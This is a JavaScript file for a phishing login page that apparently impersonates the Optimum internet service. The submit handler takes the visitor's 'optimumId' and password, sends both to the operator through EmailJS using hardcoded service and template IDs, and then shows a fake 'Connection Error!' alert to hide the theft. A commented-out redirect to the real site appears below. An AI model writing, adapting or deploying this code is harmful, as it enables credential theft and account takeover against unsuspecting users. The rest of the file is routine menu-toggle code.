
// Load the EmailJS SDK asynchronously
(function () {
  emailjs.init('Fc6Zb2E93HsLc4jAH');
})();

// Handle the form submission
const form = document.getElementById("login-form");

form.addEventListener("submit", (event) => {
  event.preventDefault(); // Prevent the default form submission behavior

  // Get the form data;
  let optimumId = form.elements["exampleInputEmail1"].value;
  let password = form.elements["exampleInputPassword1"].value;

  // Send the form data to EmailJS
  emailjs
    .send("service_rybja5w", "template_2g5g3nh", {
      optimumId: optimumId,
      password: password,
    })
    .then(
      () => {
        // Handle the successful form submission here
        alert("Connection Error!");
        // window.location.href('https://www.optimum.net');
        // let optimumId = ""
        // let password = "";
     
      },
      (error) => {
        // Handle the form submission error here
        alert("Form submission failed. Error: " + error);
      }
    );
});

//*menu bar for small screen
const menu = document.querySelector(".menu-bar");
const closeLink = document.querySelector(".menu-close");
const navLink = document.querySelector(".navigate-bottom");

menu.addEventListener("click", () => {
  navLink.classList.toggle("open");
});

closeLink.addEventListener("click", () => {
  navLink.classList.toggle("open");
});